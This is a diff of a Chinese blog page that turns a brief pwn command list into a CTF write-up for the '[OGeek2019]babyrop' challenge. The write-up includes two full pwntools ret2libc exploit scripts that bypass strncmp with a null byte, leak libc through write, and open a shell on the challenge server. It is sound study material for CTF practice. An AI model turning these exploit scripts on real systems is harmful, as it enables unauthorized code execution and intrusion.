@@ -15,7 +15,7 @@
   <meta name="description" content="">
   <meta name="author" content="Mr.BelieVe">
   <meta name="keywords" content="">
-  <title>Pwn常用指令 ~ Mr.BelieVe&#39;s Treasure</title>
+  <title>[OGeek2019]babyrop ~ Mr.BelieVe&#39;s Treasure</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -111,7 +111,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期一, 十二月 23日 2019, 12:45 下午
+                  星期二, 一月 7日 2020, 12:32 下午
                 </p>
               
 
@@ -120,7 +120,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    31 字
+                    674 字
                   </span>&nbsp;
                 
 
@@ -128,7 +128,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      1 分钟
+                      3 分钟
                   </span>&nbsp;
                 
 
@@ -161,11 +161,150 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="Pwn常用"><a href="#Pwn常用" class="headerlink" title="Pwn常用"></a>Pwn常用</h1><p><code>ldd filename</code> 读取libc</p>
-<p>ROPgadget –binary filename –only “pop|ret”</p>
-<p>u64(sh.recvuntil(“\x7f”)[-6:].ljust(8,’\x00’)</p>
-<p>u32(sh.recvuntil(“\xf7”)[-4:]</p>
-<h2 id="慢慢补充，哎"><a href="#慢慢补充，哎" class="headerlink" title="慢慢补充，哎"></a>慢慢补充，哎</h2>
+            <h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113815190.png" srcset="undefined" alt="image-20200109113815190"></p>
+<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113247829.png" srcset="undefined" alt="image-20200109113247829"></p>
+<p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113307666.png" srcset="undefined" alt="image-20200109113307666"></p>
+<p>为了绕过strncmp，我们在v6这里可以放一个\x00 因为strlen会在识别到\x00之后停止，这样strncmp就会默认返回0</p>
+<p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113459963.png" srcset="undefined" alt="image-20200109113459963"></p>
+<p>这里的v5返回值又跟下面的a1是一致的</p>
+<p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113326191.png" srcset="undefined" alt="image-20200109113326191"></p>
+<p><img src="/2020/01/07/[OGeek2019]babyrop/image-20200109113733376.png" srcset="undefined" alt="image-20200109113733376"></p>
+<p>这里也没有啥可以调用的</p>
+<p>那就是rop，leak libc了</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="leak-libc版"><a href="#leak-libc版" class="headerlink" title="leak libc版"></a>leak libc版</h3><pre><code class="python">#!/usr/bin/python2.7
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;[OGeek2019]babyrop&#39;)
+lib = ELF(&quot;./libc-2.23.so&quot;)
+sh = 0
+def pwn(ip,port,debug):
+    global lib
+    global sh
+    if debug == 1:
+        sh = process(&#39;./[OGeek2019]babyrop&#39;)
+        lib = ELF(&quot;./libc-2.23.so&quot;)
+    else:
+        sh = remote(ip,port)
+        lib = ELF(&quot;./libc-2.23.so&quot;)
+    main_start = 0x8048825
+    write_plt = elf.plt[&#39;write&#39;]
+    write_got = elf.got[&#39;write&#39;]
+    pop_ret = 0x80488F9
+    libc = elf.got[&#39;__libc_start_main&#39;]
+    payload = &quot;\x00&quot;
+    payload += &quot;\xff&quot; * 7
+    sh.sendline(payload)
+
+    sh.recvuntil(&quot;Correct\n&quot;)
+    payload = cyclic(0xE7 + 0x4)
+    payload += p32(write_plt)
+    payload += p32(pop_ret)
+    payload += p32(1)
+    payload += p32(libc)
+    payload += p32(4)
+    payload += p32(main_start)
+    sh.sendline(payload)
+
+    __libc_start_main = u32(sh.recv(4))
+    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]
+    system = libc + lib.symbols[&#39;system&#39;]
+    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()
+
+    log.success(&quot;libc: &quot; + hex(libc))
+    log.success(&quot;system: &quot; + hex(system))
+    log.success(&quot;binsh: &quot; + hex(binsh))
+
+    payload = &quot;\x00&quot;
+    payload += &quot;\xff&quot; * 7
+    sh.sendline(payload)
+
+    sh.recvuntil(&quot;Correct\n&quot;)
+    payload = cyclic(0xE7 + 0x4)
+    payload += p32(system)
+    payload += p32(0xdeadbeef)
+    payload += p32(binsh)
+    sh.sendline(payload)
+    sh.interactive()
+if __name__ ==  &quot;__main__&quot;:
+    pwn(&quot;node3.buuoj.cn&quot;,29257,0 )</code></pre>
+<h3 id="leak-write"><a href="#leak-write" class="headerlink" title="leak write"></a>leak write</h3><pre><code class="python">#!/usr/bin/python2.7
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;[OGeek2019]babyrop&#39;)
+lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+sh = 0
+def pwn(ip,port,debug):
+    global lib
+    global sh
+    if debug == 1:
+        sh = process(&#39;./[OGeek2019]babyrop&#39;)
+        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+    else:
+        sh = remote(ip,port)
+        lib = ELF(&quot;./libc-2.23.so&quot;)
+    main_start = 0x8048825
+    write_plt = elf.plt[&#39;write&#39;]
+    write_got = elf.got[&#39;write&#39;]
+    pop_ret = 0x80488F9
+
+    payload = &quot;\x00&quot;
+    payload += &quot;\xff&quot; * 7
+    sh.sendline(payload)
+
+    sh.recvuntil(&quot;Correct\n&quot;)
+    payload = cyclic(0xE7 + 0x4)
+    payload += p32(write_plt)
+    payload += p32(pop_ret)
+    payload += p32(1)
+    payload += p32(write_got)
+    payload += p32(4)
+    payload += p32(main_start)
+    sh.sendline(payload)
+
+    write_addr = u32(sh.recv(4))
+    libc = write_addr - lib.symbols[&#39;write&#39;]
+    system = libc + lib.symbols[&#39;system&#39;]
+    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()
+
+    log.success(&quot;libc: &quot; + hex(libc))
+    log.success(&quot;system: &quot; + hex(system))
+    log.success(&quot;binsh: &quot; + hex(binsh))
+
+    payload = &quot;\x00&quot;
+    payload += &quot;\xff&quot; * 7
+    sh.sendline(payload)
+
+    sh.recvuntil(&quot;Correct\n&quot;)
+    payload = cyclic(0xE7 + 0x4)
+    payload += p32(system)
+    payload += p32(0xdeadbeef)
+    payload += p32(binsh)
+    sh.sendline(payload)
+    sh.interactive()
+if __name__ ==  &quot;__main__&quot;:
+    pwn(&quot;node3.buuoj.cn&quot;,29257,0)
+</code></pre>
+<h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><pre><code class="c">#include&lt;stdio.h&gt;
+int main()
+{
+ char a[] = {&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;};
+   char b[] = {&#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;};
+   char buffer[10];
+  sprintf(buffer, &quot;%.4s%.4s&quot;, a, b);
+   printf(&quot;%s\n&quot;, buffer);
+  return 0;
+}
+</code></pre>
+<p><img src="/2020/01/07/[OGeek2019]babyrop/SouthEast.png" srcset="undefined" alt="img"></p>
+<p>将ab写入buffer</p>
+<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>ssize_t read (int fd, void *buf, size_t count);<br>read(a,buf,c)<br>打开文件a，读取c个字节，存到buf中<br>返回实际读到的字节数。如果出错 返回-1</p>
+<p>read(0,&amp;buf,4u)</p>
+<p>从shell读取4u到buf中</p>
+
             <hr>
           </div>
           <br>
@@ -331,7 +470,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Pwn常用指令&nbsp;",
+        "[OGeek2019]babyrop&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
